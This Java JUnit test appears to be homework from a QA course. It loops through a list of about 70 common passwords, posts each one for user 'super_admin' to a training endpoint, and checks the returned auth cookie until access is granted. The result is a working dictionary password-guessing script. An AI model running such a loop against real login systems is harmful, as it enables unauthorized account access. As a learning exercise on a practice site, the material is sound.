
import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.lang.Thread;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.hamcrest.Matchers.*;

public class HelloWorldTest {

    @Test
    public void testRestAssured() {

        List<String> allPassword = new ArrayList<>();
        allPassword.add("password");
        allPassword.add("123456");
        allPassword.add("12345678");
        allPassword.add("qwerty");
        allPassword.add("abc123");
        allPassword.add("monkey");
        allPassword.add("1234567");
        allPassword.add("letmein");
        allPassword.add("trustno1");
        allPassword.add("dragon");
        allPassword.add("baseball");
        allPassword.add("111111");
        allPassword.add("iloveyou");
        allPassword.add("master");
        allPassword.add("sunshine");
        allPassword.add("ashley");
        allPassword.add("bailey");
        allPassword.add("passw0rd");
        allPassword.add("shadow");
        allPassword.add("123123");
        allPassword.add("654321");
        allPassword.add("superman");
        allPassword.add("qazwsx");
        allPassword.add("michael");
        allPassword.add("Football");
        allPassword.add("12345");
        allPassword.add("qwerty123");
        allPassword.add("1q2w3e4r");
        allPassword.add("admin");
        allPassword.add("qwertyuiop");
        allPassword.add("555555");
        allPassword.add("lovely");
        allPassword.add("7777777");
        allPassword.add("welcome");
        allPassword.add("888888");
        allPassword.add("princess");
        allPassword.add("password1");
        allPassword.add("123qwe");
        allPassword.add("666666");
        allPassword.add("football");
        allPassword.add("!@#$%^&*");
        allPassword.add("charlie");
        allPassword.add("aa123456");
        allPassword.add("donald");
        allPassword.add("donald");
        allPassword.add("login");
        allPassword.add("starwars");
        allPassword.add("hello");
        allPassword.add("freedom");
        allPassword.add("whatever");
        allPassword.add("1234567890");
        allPassword.add("1234");
        allPassword.add("solo");
        allPassword.add("121212");
        allPassword.add("flower");
        allPassword.add("hottie");
        allPassword.add("loveme");
        allPassword.add("zaq1zaq1");
        allPassword.add("zaq1zaq1");
        allPassword.add("1qaz2wsx");
        allPassword.add("mustang");
        allPassword.add("access");
        allPassword.add("696969");
        allPassword.add("batman");
        allPassword.add("adobe123");
        allPassword.add("photoshop");
        allPassword.add("azerty");
        allPassword.add("000000");
        allPassword.add("jesus");
        allPassword.add("ninja");

        for (int i = 0; i < allPassword.size(); i++){

            Map<String, String> date =  new HashMap<>();
            date.put("login", "super_admin");
            date.put("password", allPassword.get(i));

            Response responseForSecretPassword = RestAssured
                .given()
                .body(date)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();

            String cookieForSecretPassword = responseForSecretPassword.getCookie("auth_cookie");

            Map<String, String> cookieForCheckAuth =  new HashMap<>();
            cookieForCheckAuth.put("auth_cookie", cookieForSecretPassword);

            Response responseForAuthorization = RestAssured
                .given()
                .cookies(cookieForCheckAuth)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();

            String responseText = responseForAuthorization.getBody().asString();
            if(responseText.equals("You are authorized")){
                System.out.println("Фраза из ответ " + responseText);
                System.out.println("Пароль " + allPassword.get(i));
                break;
            };


        }

    }

}


